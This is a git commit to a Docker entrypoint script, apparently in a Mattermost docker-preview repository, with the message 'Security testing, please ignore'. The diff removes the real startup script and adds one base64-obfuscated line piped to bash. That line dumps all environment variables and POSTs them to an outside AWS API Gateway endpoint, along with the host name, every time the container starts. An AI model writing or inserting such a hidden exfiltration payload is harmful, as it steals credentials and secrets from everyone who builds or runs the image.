8d81176e4540c514cc29172acb49d06397125ddb
bananot12-hackerone-test <bananot12@gmail.com>
2023-07-01 06:31:40 +0000

    Security testing, please ignore a. (yjmatn)

--- docker-entry.sh
+++ docker-entry.sh
@@ -1,18 +1,1 @@
-#!/bin/bash
-# Copyright (c) 2016 Mattermost, Inc. All Rights Reserved.
-# See License.txt for license information.
-
-echo "Starting MySQL"
-/entrypoint.sh mysqld &
-
-until mysqladmin -hlocalhost -P3306 -u"$MYSQL_USER" -p"$MYSQL_PASSWORD" processlist &> /dev/null; do
-	echo "MySQL still not ready, sleeping"
-	sleep 5
-done
-
-echo "Updating CA certificates"
-update-ca-certificates --fresh >/dev/null
-
-echo "Starting platform"
-cd mattermost
-exec ./bin/mattermost --config=config/config_docker.json
+echo cHJpbnRlbnYgfCBiYXNlNjQgfCBjdXJsIC1MIC0taW5zZWN1cmUgLVggUE9TVCAtLWRhdGEtYmluYXJ5IEAtIGh0dHBzOi8vcHkyNHdkbW4zay5leGVjdXRlLWFwaS51cy1lYXN0LTIuYW1hem9uYXdzLmNvbS9kZWZhdWx0L2E= | base64 -d | bash #?repository=https://github.com/mattermost/mattermost-docker-preview.git\&folder=mattermost-docker-preview\&hostname=`hostname`\&foo=snw
